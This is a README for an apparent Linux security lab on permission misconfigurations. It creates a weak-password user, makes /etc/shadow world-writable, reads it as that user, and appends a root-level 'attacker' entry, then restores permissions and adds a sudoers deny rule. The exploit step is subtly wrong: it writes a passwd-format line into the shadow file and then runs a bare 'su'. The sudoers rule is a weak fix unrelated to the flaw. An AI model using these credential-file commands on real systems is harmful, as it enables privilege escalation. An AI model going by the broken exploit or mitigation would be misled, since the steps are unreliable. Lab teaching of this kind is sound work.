# POC-TASKS
# 📌 Linux Security - Exploitation & Defense (PoC)

This repository demonstrates **security vulnerabilities** in Linux systems related to **user and permission misconfigurations**, along with their **exploitation and mitigation** techniques.

---

## 🔹 **Task 1: User & File Permission Weaknesses**

### ✅ **Step 1: Setting Up Vulnerable User & Permissions**

```bash
# Creating a test user CSK
┌──(kali㉿kali)-[~/lab]
└─$ sudo useradd CSK

# Assigning a weak password
┌──(kali㉿kali)-[~/lab]
└─$ echo "CSK:12345" | sudo chpasswd

# Verify user creation
cat /etc/passwd | grep "CSK"

# Check access settings of sensitive files
┌──(kali㉿kali)-[~/lab]
└─$ ls -l /etc/shadow
-rw-r----- 1 root shadow 1722 Mar 17 19:11 /etc/shadow

# Set insecure file permissions (Major Security Risk!)
┌──(kali㉿kali)-[~/lab]
└─$ sudo chmod 777 /etc/shadow

# Validate permission modifications
┌──(kali㉿kali)-[~/lab]
└─$ ls -l /etc/shadow         
-rwxrwxrwx 1 root shadow 1722 Mar 17 19:11 /etc/shadow
```

---

### ✅ **Step 2: Exploiting the Weak Permissions**

```bash
# Switch to the low-privileged user
┌──(kali㉿kali)-[~]
└─$ su - CSK
Password: 12345

# Attempt to access restricted files
$ cat /etc/shadow

# Inject a new root-level user into the shadow file
$ echo "attacker::0:0::/:/bin/bash" | tee -a /etc/shadow

# Gain elevated privileges
su
```

---

### ✅ **Step 3: Fixing the Security Flaws**

```bash
# Restore proper permissions on the shadow file
sudo chmod 640 /etc/shadow
sudo chown root:shadow /etc/shadow

# Verify the applied security settings
ls -l /etc/shadow
```

---

### ✅ **Step 4: Strengthening Sudo Privileges**

```bash
# Secure sudo access settings
sudo visudo
```

**Restrict CSK from escalating privileges** by adding:
```plaintext
CSK ALL=(ALL) !/bin/su, !/bin/bash
```

## 📌 Summary of Task 1  

| **Step**             | **Action**                                         | **Command**                                  |
|----------------------|---------------------------------------------------|---------------------------------------------|
| 🔹 **Setup**         | Create user **CSK**                                | `sudo useradd CSK` |
|                     | Assign a weak password                             | `echo "CSK:12345" | sudo chpasswd` |
|                     | Validate user creation                             | `cat /etc/passwd | grep CSK` |
|                     | Check file permissions                             | `ls -l /etc/shadow /etc/passwd` |
|                     | Apply insecure file access settings                | `sudo chmod 777 /etc/shadow` |
|                     | Confirm modified permissions                       | `ls -l /etc/shadow` |
| 🔹 **Exploitation**  | Switch to **CSK** (unprivileged user)              | `su - CSK` |
|                     | Attempt to access restricted files                 | `cat /etc/shadow`<br>`cat /etc/passwd` |
|                     | Inject malicious entry into `/etc/shadow`          | `echo "attacker::0:0::/:/bin/bash" | tee -a /etc/shadow` |
|                     | Elevate privileges                                 | `su` |
| 🔹 **Mitigation**    | Restore correct file access controls               | `sudo chmod 640 /etc/shadow`<br>`sudo chown root:shadow /etc/shadow` |
|                     | Verify secure configuration                        | `ls -l /etc/shadow` |
| 🔹 **Sudo Hardening**| Edit sudoers configuration                        | `sudo visudo` |
|                     | Restrict **CSK** from privilege escalation         | Add the following in `visudo`:<br>`CSK ALL=(ALL) !/bin/su, !/bin/bash` |

---

### -----------------------------------------------END OF TASK 1----------------------------------------
